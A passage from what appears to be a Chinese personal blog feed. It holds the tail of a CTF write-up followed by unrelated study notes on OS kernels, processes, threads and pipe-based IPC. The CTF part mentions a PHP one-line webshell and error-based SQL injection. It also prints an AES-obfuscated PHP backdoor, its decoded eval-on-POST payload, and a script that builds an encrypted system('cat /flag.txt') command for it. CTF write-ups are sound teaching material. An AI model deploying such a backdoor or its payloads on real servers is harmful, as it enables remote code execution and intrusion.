        <content type="html"><![CDATA[<h4 id="web"><a href="#web" class="headerlink" title="web"></a>web</h4><h5 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h5><p>略</p><h5 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h5><p>上传 php一句话木马</p><h5 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h5><p>sql 注入注入点在消息通知中，找到id参数。数字型注入直接找到order by 4<br>直接报错注入。</p><h5 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h5><p>  web3 是唯一一道有难度的题目，可以看到一开始给了一个页面。显示的是一个系统代码被修改了。我们扫描目录扫描到wwwroot.zip。直接把系统源码下载下来。</p><p>  其实我们仔细分析一下这个提示，他就说因为被篡改了所以说网站紧急关闭。同时把系统代码备份了。此时我们考虑如果说我们没有交互界面我们无法进行操作，那么肯定是有一些站点没有关闭。<br>  遍历所有文件，发现只有一个文件返回了一个字符串，直接审计这个文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">describedssTest.php</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type: text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="variable">$p8</span> = <span class="string">&#x27;3b7430adaed18facca7b799229138b7b&#x27;</span>;</span><br><span class="line"><span class="variable">$a8</span> = <span class="string">&#x27;TURNeU9UWTBOelUwTmprd05UUTVOR0ZLV1ZwdU9XSkZORmh2WnpoS1RrNW1jRTFrTkdjOVBRPT0=&#x27;</span>;</span><br><span class="line"><span class="variable">$d8</span> = <span class="string">&#x27;TURNeU9UWTBOelUwTmprd05UUTVOR012V1c5cVJXNXBkWEJyZDFsemJsQlpNMmRITjNaYWVFVnFPVWRqVnpoWlUyNXZNbmhDU21jd2RHTkxRazF2U1hvMU9FNUNWM2RNUjFWYVJuVnBiV3czUlVwUldFMTFhakp2VjJKS1NIVlJUMU5UYjNoSWExUk5hMlZXY21OdlRuaHVRMjlsVkV4aEwzbGpQUT09&#x27;</span>;</span><br><span class="line"><span class="variable">$v8</span> = <span class="string">&#x27;0329647546905494&#x27;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">e</span>(<span class="params"><span class="variable">$D</span>, <span class="variable">$K</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$cipher</span> = <span class="string">&#x27;aes-128-cbc&#x27;</span>;</span><br><span class="line">    <span class="variable">$encrypted</span> = <span class="title function_ invoke__">openssl_encrypt</span>(<span class="variable">$D</span>, <span class="variable">$cipher</span>, <span class="variable">$K</span>, <span class="number">0</span>, <span class="variable">$GLOBALS</span>[<span class="string">&#x27;v8&#x27;</span>]);</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$GLOBALS</span>[<span class="string">&#x27;v8&#x27;</span>] . <span class="variable">$encrypted</span>);</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$result</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">d</span>(<span class="params"><span class="variable">$D</span>, <span class="variable">$K</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$cipher</span> = <span class="string">&#x27;aes-128-cbc&#x27;</span>;</span><br><span class="line">    <span class="variable">$decodedData</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$D</span>));</span><br><span class="line">    <span class="variable">$encryptedData</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$decodedData</span>, <span class="title function_ invoke__">openssl_cipher_iv_length</span>(<span class="variable">$cipher</span>));</span><br><span class="line">    <span class="variable">$decrypted</span> = <span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$encryptedData</span>, <span class="variable">$cipher</span>, <span class="variable">$K</span>, <span class="number">0</span>, <span class="variable">$GLOBALS</span>[<span class="string">&#x27;v8&#x27;</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$decrypted</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a8</span> = <span class="title function_ invoke__">trim</span>(<span class="title function_ invoke__">d</span>(<span class="variable">$a8</span>, <span class="variable">$p8</span>));</span><br><span class="line"><span class="title function_ invoke__">ob_start</span>();</span><br><span class="line"><span class="variable">$a8</span>(<span class="title function_ invoke__">trim</span>(<span class="title function_ invoke__">d</span>(<span class="variable">$d8</span>, <span class="variable">$p8</span>)));</span><br><span class="line"><span class="variable">$O</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line"><span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">e</span>(<span class="variable">$O</span>, <span class="variable">$p8</span>); <span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>仔细分析一下逻辑，其实只看下面的一些语句， 就知道先 解密 </p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">a8 并且解密出来是assert直接拼接执行,同时我们又解密是<span class="variable">$d8</span>，出来是一个木马。直接利用木马执行，里面需要注意<span class="built_in">eval</span>每次只执行一层，同时需要注意<span class="string">&#x27;&#x27;</span> 需要被\转义。同时需要注意20241026是md5两次才能等于3b7430adaed18facca7b799229138b7b</span></span><br></pre></td></tr></table></figure><p>d8解密出来的木马 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@<span class="keyword">eval</span>(<span class="string">&quot;if(md5(@\$_GET[&#x27;id&#x27;])===\$p8)&#123;@eval(trim(d(\$_POST[&#x27;d&#x27;],\$p8)));&#125;&quot;</span>)</span><br></pre></td></tr></table></figure><h6 id="payload生成"><a href="#payload生成" class="headerlink" title="payload生成"></a>payload生成</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">pherror_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type: text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="variable">$p8</span> = <span class="string">&#x27;3b7430adaed18facca7b799229138b7b&#x27;</span>;</span><br><span class="line"><span class="variable">$a8</span> = <span class="string">&#x27;TURNeU9UWTBOelUwTmprd05UUTVOR0ZLV1ZwdU9XSkZORmh2WnpoS1RrNW1jRTFrTkdjOVBRPT0=&#x27;</span>;</span><br><span class="line"><span class="variable">$d8</span> = <span class="string">&#x27;TURNeU9UWTBOelUwTmprd05UUTVOR012V1c5cVJXNXBkWEJyZDFsemJsQlpNMmRITjNaYWVFVnFPVWRqVnpoWlUyNXZNbmhDU21jd2RHTkxRazF2U1hvMU9FNUNWM2RNUjFWYVJuVnBiV3czUlVwUldFMTFhakp2VjJKS1NIVlJUMU5UYjNoSWExUk5hMlZXY21OdlRuaHVRMjlsVkV4aEwzbGpQUT09&#x27;</span>;</span><br><span class="line"><span class="variable">$v8</span> = <span class="string">&#x27;0329647546905494&#x27;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">e</span>(<span class="params"><span class="variable">$D</span>, <span class="variable">$K</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$cipher</span> = <span class="string">&#x27;aes-128-cbc&#x27;</span>;</span><br><span class="line">    <span class="variable">$encrypted</span> = <span class="title function_ invoke__">openssl_encrypt</span>(<span class="variable">$D</span>, <span class="variable">$cipher</span>, <span class="variable">$K</span>, <span class="number">0</span>, <span class="variable">$GLOBALS</span>[<span class="string">&#x27;v8&#x27;</span>]);</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$GLOBALS</span>[<span class="string">&#x27;v8&#x27;</span>] . <span class="variable">$encrypted</span>);</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$result</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">d</span>(<span class="params"><span class="variable">$D</span>, <span class="variable">$K</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$cipher</span> = <span class="string">&#x27;aes-128-cbc&#x27;</span>;</span><br><span class="line">    <span class="variable">$decodedData</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$D</span>));</span><br><span class="line">    <span class="variable">$encryptedData</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$decodedData</span>,     </span><br><span class="line">     <span class="title function_ invoke__">openssl_cipher_iv_length</span>(<span class="variable">$cipher</span>));</span><br><span class="line">    <span class="variable">$decrypted</span> = <span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$encryptedData</span>, <span class="variable">$cipher</span>, <span class="variable">$K</span>, <span class="number">0</span>, <span class="variable">$GLOBALS</span>[<span class="string">&#x27;v8&#x27;</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$decrypted</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;eval (&#x27;system(\&#x27;cat /flag.txt \&#x27;);&#x27;);&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span> = <span class="title function_ invoke__">e</span>(<span class="variable">$a</span>, <span class="variable">$p8</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h6 id="返回结果解密"><a href="#返回结果解密" class="headerlink" title="返回结果解密"></a>返回结果解密</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p8</span> = <span class="string">&#x27;3b7430adaed18facca7b799229138b7b&#x27;</span>;</span><br><span class="line"><span class="variable">$v8</span> = <span class="string">&#x27;0329647546905494&#x27;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">d</span>(<span class="params"><span class="variable">$D</span>, <span class="variable">$K</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$cipher</span> = <span class="string">&#x27;aes-128-cbc&#x27;</span>;</span><br><span class="line">    <span class="variable">$decodedData</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$D</span>));</span><br><span class="line">    <span class="variable">$encryptedData</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$decodedData</span>, <span class="title function_ invoke__">openssl_cipher_iv_length</span>(<span class="variable">$cipher</span>));</span><br><span class="line">    <span class="variable">$decrypted</span> = <span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$encryptedData</span>, <span class="variable">$cipher</span>, <span class="variable">$K</span>, <span class="number">0</span>, <span class="variable">$GLOBALS</span>[<span class="string">&#x27;v8&#x27;</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$decrypted</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">d</span>(<span class="string">&quot;TURNeU9UWTBOelUwTmprd05UUTVOREZYVW1wMFpuUTFTblJyV1VGbVV6a3JOa042ZWs4MVQxSnNURWxUWTJoeWVYSlNaRU5GWmxGc2FHOVRVamwyY0hwQ2FXNVVTMEpSTkhoU00wczNXWFk9&quot;</span>, <span class="variable">$p8</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h4><h5 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h5><p>直接搜索{</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统-内核</title>
      <link href="/2024/10/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E5%86%85%E6%A0%B8/"/>
      <url>/2024/10/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E5%86%85%E6%A0%B8/</url>
      
        <content type="html"><![CDATA[<p>操作系统内核（Operating System Kernel）是操作系统的核心部分，它负责管理系统的硬件资源，并为用户程序提供必要的服务。内核是操作系统中最基本、最核心的部分</p><ol><li><strong>进程管理</strong>：</li></ol><p>    - 内核负责创建、调度、管理和终止进程。</p><p>    - 它还负责线程的调度和多任务处理。</p><ol start="2"><li><strong>内存管理</strong>：</li></ol><p>    - 内核负责分配、管理、回收内存资源。</p><p>    - 它使用虚拟内存技术来扩展可用的内存空间。</p><ol start="3"><li><strong>文件系统管理</strong>：</li></ol><p>    - 内核管理文件系统的创建、删除和维护。</p><p>    - 它处理文件的读取、写入、打开和关闭等操作。</p><ol start="4"><li><strong>设备驱动</strong>：</li></ol><p>    - 内核包含设备驱动程序，用于控制硬件设备。</p><p>    - 它抽象了硬件的细节，为用户程序提供了统一的接口。</p><ol start="5"><li><strong>安全和权限管理</strong>：</li></ol><p>    - 内核负责系统的安全，包括用户认证和权限控制。</p><p>    - 它确保用户和程序只能访问授权的资源。</p><ol start="6"><li><strong>系统调用</strong>：</li></ol><p>    - 内核提供了系统调用接口，允许用户程序请求操作系统服务。</p><p>    - 这些服务包括文件操作、进程控制、通信等。</p><ol start="7"><li><strong>中断和异常处理</strong>：</li></ol><p>    - 内核负责处理来自硬件的中断和软件的异常。</p><p>    - 它确保系统能够响应外部事件，如用户输入或硬件故障。</p><ol start="8"><li><strong>系统服务</strong>：</li></ol><p>    - 内核提供了一系列系统服务，如时间管理、同步和信号处理。</p><p>    - 这些服务支持用户程序的运行和开发。</p><ol start="9"><li><strong>硬件抽象</strong>：</li></ol><p>    - 内核为上层应用程序提供了硬件的抽象，使得应用程序不需要关心底层硬件的具体实现。</p><ol start="10"><li><strong>网络通信</strong>：</li></ol><p>    - 内核处理网络协议栈，允许系统进行网络通信。</p><p>    - 它支持数据包的发送和接收，以及网络设备的管理。</p><h4 id="宏内核（Monolithic-Kernel）"><a href="#宏内核（Monolithic-Kernel）" class="headerlink" title="宏内核（Monolithic Kernel）"></a>宏内核（Monolithic Kernel）</h4><ol><li><strong>定义</strong>：</li></ol><p>    - 宏内核是一种传统的操作系统内核架构，它将操作系统的大部分功能，如进程管理、内存管理、文件系统、设备驱动等，都集成在一个大型的内核模块中。</p><ol start="2"><li><strong>特点</strong>：</li></ol><p>    - <strong>高度集成</strong>：所有核心功能都在内核空间运行，这使得内核代码量大，复杂度高。</p><p>    - <strong>性能优势</strong>：由于所有功能都在内核空间执行，减少了用户空间和内核空间之间的切换，从而提高了系统性能。</p><p>    - <strong>开发难度</strong>：内核代码的复杂性使得开发和维护更加困难。</p><p>    - <strong>稳定性问题</strong>：内核中的任何部分的错误都可能导致整个系统的崩溃。</p><ol start="3"><li><strong>代表操作系统</strong>：</li></ol><p>    - Linux、Windows、macOS等主流操作系统都采用了宏内核或类似宏内核的设计。</p><h4 id="微内核（Microkernel）"><a href="#微内核（Microkernel）" class="headerlink" title="微内核（Microkernel）"></a>微内核（Microkernel）</h4><ol><li><strong>定义</strong>：</li></ol><p>    - 微内核是一种操作系统架构，它将操作系统的核心功能最小化，只保留最基本的服务，如进程通信、地址空间管理和线程调度等。其他功能，如文件系统、设备驱动等，都作为独立的服务运行在用户空间。</p><ol start="2"><li><strong>特点</strong>：</li></ol><p>    - <strong>模块化</strong>：微内核将操作系统的不同功能模块化，提高了系统的可扩展性和可维护性。</p><p>    - <strong>安全性</strong>：由于内核功能最小化，减少了内核的攻击面，提高了系统的安全性。</p><p>    - <strong>稳定性</strong>：用户空间的服务崩溃不会影响到内核的稳定性，从而提高了系统的稳定性。</p><p>    - <strong>性能开销</strong>：用户空间和内核空间之间的频繁切换可能导致性能开销。</p>]]></content>
      
      
      <categories>
          
          <category> 操作系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统-进程</title>
      <link href="/2024/10/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E8%BF%9B%E7%A8%8B/"/>
      <url>/2024/10/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E8%BF%9B%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h4 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h4><ul><li>独立的应用程序在数据集合上的独立执行。进程是操作系统进行资源分配和调度的基本单位，是应用程序运行的实体。一个进程可以包含一个或多个线程（Thread），线程是进程中的实际执行单元。</li></ul><h5 id="进程内部保存"><a href="#进程内部保存" class="headerlink" title="进程内部保存:"></a>进程内部保存:</h5><ol><li>段表</li><li>共享库</li><li>栈</li><li>堆</li><li>初始化数据</li><li>代码</li></ol><p><em><strong>进程隔离</strong></em></p><p>一般来讲就是段表，映射时候进行一个内存隔离。</p><h4 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h4><p>动态性<br>并发性<br>独立性<br>制约性</p><h5 id="进程控制块"><a href="#进程控制块" class="headerlink" title="进程控制块"></a>进程控制块</h5><p>进程控制块（Process Control Block，简称 PCB）是操作系统中用于描述进程状态和控制进程运行的数据结构。PCB 是进程存在的唯一标志，它记录了操作系统在管理进程时所需的所有信息。当进程被创建时，操作系统会为其创建一个 PCB，当进程结束时，操作系统会回收其 PCB。</p><ol><li>进程标识符<br>与进程相关的唯一标识符pid</li><li>进程的状态<br>进程目前处于运行态、等待态、就绪态等。</li><li>尤先级<br>相对于其他进程的优先顺序</li><li>CPU现场保护区<br>工作寄存器、指令计数器和程序状态字等</li><li>内存指针<br>当前队列指针、总链指针等</li><li>占用资源</li></ol><h4 id="进程状态"><a href="#进程状态" class="headerlink" title="进程状态"></a>进程状态</h4><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20241005143821.png" alt="image.png"></p><h4 id="多进程"><a href="#多进程" class="headerlink" title="多进程"></a>多进程</h4><p>多个进程，一般分为就绪队列和磁盘等待队列(等待某个事件进行触发)</p><h4 id="GUI图形界面使用"><a href="#GUI图形界面使用" class="headerlink" title="GUI图形界面使用"></a>GUI图形界面使用</h4><p>操作系统提供的图形界面方式的使用，本质上是通过（消息传递）机制实现的。</p><h4 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h4><h5 id="什么是线程"><a href="#什么是线程" class="headerlink" title="什么是线程?"></a>什么是线程?</h5><p>在进程内部增加一类实体，满足以下特性<br><br>(1)实体之间可以并发执行<br>(2)实体之间共享相同的地址空间<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20241005150526.png" alt="image.png"></p><p>线程&#x3D;进程-共享资源<br>线程的优点：<br>一个进程中可以同时存在多个线程<br>各个线程之间可以并发地执行<br>各个线程之间可以共享地址空间和文件等资源<br>线程的缺点：<br>一个线程崩溃，会导致其所属进程的所有线程<br>崩溃</p><h5 id="进程和线程的比较"><a href="#进程和线程的比较" class="headerlink" title="进程和线程的比较"></a>进程和线程的比较</h5><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20241005150922.png" alt="image.png"></p><h5 id="线程实现"><a href="#线程实现" class="headerlink" title="线程实现"></a>线程实现</h5><pre><code>用户线程：在用户空间实现</code></pre><p>POSIX Pthreads,Mach C-<br>threads,Solaris threads</p><pre><code>内核线程：在内核中实现</code></pre><p>Windows,<br>Solaris Linux</p><h6 id="用户线程"><a href="#用户线程" class="headerlink" title="用户线程"></a>用户线程</h6><p>   由用户级线程库函数完成线程的管理（线程的创建、终止、同步和调度等)</p><p><em><strong>优点</strong></em><br>■不依赖于操作系统的内核<br>内核不了解用户线程的存在<br>可用于不支持线程的多进程操作系统<br>■在用户空间实现的线程机制<br>每个进程有私有的线程控制块（TCB)列表<br>TCB由线程库函数维护<br>■同一进程内的用户线程切换速度快<br>无需用户态&#x2F;核心态切换<br>■允许每个进程拥有自已的线程调度算法</p><p>用户级线程的缺陷在于，当一个进程中的某个线程发起资源请求，则整个进程都将进入（阻塞）状态。内核级线程是由系统完成线程的管理，所以，当一个进程中的某个线程发起资源请求时，系统将调度该进程中的另一个线程进入运行状态，（不会）【填”会&#x2F;不会”】让整个进程进入（阻塞）状态。</p><p><em>缺点</em></p><ul><li>线程发起系统调用而阻塞时，则整个进程进入等待</li><li>不支持基于线程的处理机抢占<br>除非当前运行线程主动放弃，它所在进程的其<br>他线程无法抢占CPU</li><li>只能按进程分配CPU时间<br>多个线程进程中，每个线程的时间片较少</li></ul><h6 id="内核线程"><a href="#内核线程" class="headerlink" title="内核线程"></a>内核线程</h6><p>由内核通过系统调用实现线程机制，由内核完成线程创建、终止和管理</p><ul><li>由内核维护PCB和TCB</li><li>线程执行系统调用而被阻塞不影响其他线程</li><li>线程的创建、终止和切换相对较大<br>通过系统调用&#x2F;内核函数，在内核实现</li><li>以线程为单位进行CPU时间分配<br>多线程的进程可获得更多CPU时间</li></ul><h4 id="进程通信"><a href="#进程通信" class="headerlink" title="进程通信"></a>进程通信</h4><h5 id="共享存储"><a href="#共享存储" class="headerlink" title="共享存储"></a>共享存储</h5><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20241005154650.png" alt="image.png"></p><h5 id="管道通信"><a href="#管道通信" class="headerlink" title="管道通信"></a>管道通信</h5><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20241005154812.png" alt="image.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFFER_SIZE 100</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> pipefd[<span class="number">2</span>];</span><br><span class="line">    <span class="type">char</span> buffer[BUFFER_SIZE];</span><br><span class="line"></span><br><span class="line">    pipe(pipefd); <span class="comment">// 创建管道</span></span><br><span class="line"></span><br><span class="line">    <span class="type">pid_t</span> pid = fork(); <span class="comment">// 创建子进程</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 子进程</span></span><br><span class="line">        close(pipefd[<span class="number">0</span>]); <span class="comment">// 关闭读端</span></span><br><span class="line">        write(pipefd[<span class="number">1</span>], <span class="string">&quot;Hello from child&quot;</span>, <span class="number">16</span>);</span><br><span class="line">        close(pipefd[<span class="number">1</span>]); <span class="comment">// 关闭写端</span></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pid &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 父进程</span></span><br><span class="line">        close(pipefd[<span class="number">1</span>]); <span class="comment">// 关闭写端</span></span><br><span class="line">        wait(<span class="literal">NULL</span>); <span class="comment">// 等待子进程结束</span></span><br><span class="line">        read(pipefd[<span class="number">0</span>], buffer, <span class="keyword">sizeof</span>(buffer)); <span class="comment">// 读取数据</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Received: %s\n&quot;</span>, buffer);</span><br><span class="line">        close(pipefd[<span class="number">0</span>]); <span class="comment">// 关闭读端</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// fork 失败</span></span><br><span class="line">        perror(<span class="string">&quot;fork&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进程通信，利用管道</p><ul><li><p><strong>子进程执行完毕</strong>：子进程完成其任务并退出，通常会调用 <code>exit()</code> 函数。</p></li><li><p><strong>父进程等待</strong>：如果父进程在调用 <code>wait()</code>，它会暂停执行，直到子进程结束。这样可以确保父进程在子进程完成后再继续读取数据或进行其他操作。</p></li><li><p><strong>子进程的退出状态</strong>：一旦子进程结束，父进程可以通过 <code>wait()</code> 获得子进程的退出状态</p></li></ul><p><em><strong>通信</strong></em></p><ul><li><p><strong>创建管道</strong>：<code>pipe(pipefd);</code> 创建一个管道，<code>pipefd[0]</code> 用于读取，<code>pipefd[1]</code> 用于写入。</p></li><li><p><strong>创建子进程</strong>：<code>fork()</code> 创建一个子进程。此时，子进程和父进程都有对管道的引用。</p></li><li><p><strong>关闭不需要的端</strong>：</p><ul><li><strong>子进程</strong>：在子进程中，使用 <code>close(pipefd[0]);</code> 关闭读端，只保留写端。这样，子进程只用来写数据。</li><li><strong>父进程</strong>：在父进程中，使用 <code>close(pipefd[1]);</code> 关闭写端，只保留读端。这样，父进程只用来读数据。</li></ul></li><li><p><strong>写入数据</strong>：子进程执行 <code>write(pipefd[1], &quot;Hello from child&quot;, 16);</code>，由于子进程关闭了读端，所以可以成功写入数据。</p></li><li><p><strong>关闭写端</strong>：在写完数据后，子进程关闭写端 <code>close(pipefd[1]);</code>，这一步是为了表明数据写入完毕。</p></li><li><p><strong>父进程读取数据</strong>：父进程在等待子进程完成后，读取管道中的数据。</p></li></ul><blockquote><p>意思就是我们的进程执行if 条件判断只是一个判断子进程和父进程谁先执行的一个标准，但是我们的子进程执行完之后会回到父进程。但是父进程需要wait()让子进程先执行完毕。同时父子进程都对管道有自己的读写权限。自己可以关闭打开各个开关。</p></blockquote><h5 id="消息传递"><a href="#消息传递" class="headerlink" title="消息传递"></a>消息传递</h5><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20241005155134.png" alt="image.png"></p><h5 id="不同进程的通信方式"><a href="#不同进程的通信方式" class="headerlink" title="不同进程的通信方式"></a>不同进程的通信方式</h5><p>管道和套接字（socket）都是进程间通信（IPC）的方法，但它们在使用和功能上有所不同。管道通常用于在相关的进程（如父子进程）之间传输数据，而套接字则可以用于网络中的不同主机之间，或者在同一台机器上的无关进程之间进行通信</p><h4 id="互斥-同步问题"><a href="#互斥-同步问题" class="headerlink" title="互斥 同步问题"></a>互斥 同步问题</h4><h5 id="进程互斥"><a href="#进程互斥" class="headerlink" 